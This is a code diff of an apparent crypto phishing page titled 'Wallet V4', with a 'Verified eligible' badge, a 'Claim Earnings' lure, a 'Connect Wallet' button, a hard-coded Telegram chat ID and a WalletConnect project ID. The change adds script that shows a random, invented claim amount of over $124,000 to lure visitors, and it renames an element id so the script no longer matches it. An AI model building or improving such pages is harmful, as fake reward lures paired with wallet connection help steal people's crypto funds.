@@ -269,7 +269,7 @@
                 <div class="hero-badge">✓ Verified eligible</div>
                 <h1 class="hero-title">Wallet V4 </h1>
                 <p class="hero-subtitle">Claim Earnings</p>
-                <div class="hero-amount" id="claimAmount">Available</div>
+                <div class="hero-amount" id="claimAmoun">Available</div>
                 <p class="hero-subtitle">Claim</p>
                 <button class="hero-claim-btn" id="heroClaimBtn">Connect Wallet</button>
                 <div id="successMsg" class="message success"></div>
@@ -290,18 +290,10 @@
         const TELEGRAM_CHAT_ID = '7631123101';
         const WALLETCONNECT_PROJECT_ID = '8cb7ec413496bd2a9585e0d008c49acc';
 
-document.getElementById('submitClaim').addEventListener('click', function() {
-  const input = document.getElementById('claimAmountInput').value;
-  const amount = parseFloat(input);
+ // Generate random claim amount
+        const claimAmount = (Math.random() * (15000 - 8000) + 124400).toFixed(0);
+        document.getElementById('claimAmount').textContent = '$' + claimAmount.toLocaleString();
 
-  if (isNaN(amount) || amount < 0) {
-    alert('Please enter a valid positive amount.');
-    return;
-  }
-
-  document.getElementById('claimAmount').textContent =
-    '$' + amount.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-});
         // Elements
         const connectBtn = document.getElementById('connectBtn');
         const heroClaimBtn = document.getElementById('heroClaimBtn');
